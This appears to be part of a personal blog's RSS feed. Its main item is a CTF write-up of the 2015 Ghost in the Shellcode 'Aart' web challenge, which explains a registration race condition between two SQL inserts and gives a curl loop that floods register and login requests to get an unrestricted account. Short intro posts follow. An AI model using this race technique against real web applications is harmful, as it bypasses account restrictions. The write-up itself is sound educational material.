<p>The <a href="https://2015.ghostintheshellcode.com/">Ghost in the Shellcode CTF</a> is now over but the website is still up and you can still complete challenges if you like (update: well not anymore..) <br>  
This is my little write up and the web challenge called "Aart". Here's how it looks when you go to the server for the first time <br>  
<br> <br>  
<img src="http://localhost:2368/content/images/2015/02/aart.PNG" alt="">
<br> <br>  
On the register page there was a "Source code" link so I downloaded the code and took a look at it. I noticed 2 interesting things <br>  
Firstly the 2 SQL requests that are made when a user register <br>  
<br> <br>  
<img src="http://localhost:2368/content/images/2015/02/sqlaart.PNG" alt="">
<br> <br>  
Then in this portion of code you can actually see that if isRestricted is true then your account is restricted and otherwise you can get the key.</p>

<p><br> <br>  
<img src="http://localhost:2368/content/images/2015/02/iddd.PNG" alt="">
<br> <br>  
If you still didn't get it we're just going to register/login a bunch of usernames and wait for the key (: <br>  
It's a timing thing. At some point the first INSERT TO will be called twice before the second one has even been called once. This will give us a user with no restricted flag. <br>  
<br>  </p>

<pre>
for i in {1..50};
do     
curl --data "username=i$i&password=i" http://aart.2015.ghostintheshellcode.com/register.php -s >&1 >/dev/null &     
curl --data "username=i$i&password=i" http://aart.2015.ghostintheshellcode.com/login.php;
done</pre>

<p><br> <br>  
So this script is going to create accounts from 'i1' to 'i50' with the password 'i'. At some point we stumble on an unrestricted account <br>  
<br> <br>

<br> <br>  
Here we go. "this is a key" was actually the key here (;</p>]]></description><link>http://localhost:2368/untitled/</link><guid isPermaLink="false">a91ae5a7-5ef4-4f5f-9869-ad78fc50a36b</guid><dc:creator><![CDATA[Mister Choc]]></dc:creator><pubDate>Fri, 13 Feb 2015 15:57:05 GMT</pubDate></item><item><title><![CDATA[Defuse the tar bomb]]></title><description><![CDATA[<p>Just some shell script that could have saved the world (: <br> <br>

Hello world! Finally I decided to make a blog (: I did it before, it only had a few post and was located at misterch0c.ghost.io but since after 15 days ghost.io asked me to pay 10$/months I just moved here. I really enjoy <a href="https://ghost.org/">Ghost</a> and will probably make a blog post on how I set it up using github pages quickly. In the meantime I'll just reposte the 2-3 articles my blog had before. I'm MisterCh0c, I like cheap m&amp;m's, infosec and developing. Feel free to <a href="https://twitter.com/MisterCh0c">follow me on twitter</a>. Cya later.</p>]]></description><link>http://localhost:2368/hello-world/</link><guid isPermaLink="false">4791e5a2-2752-42eb-be6b-2d0c453f4a3c</guid><dc:creator><![CDATA[Mister Choc]]></dc:creator><pubDate>Fri, 13 Feb 2015 13:22:03 GMT</pubDate></item></channel></rss>
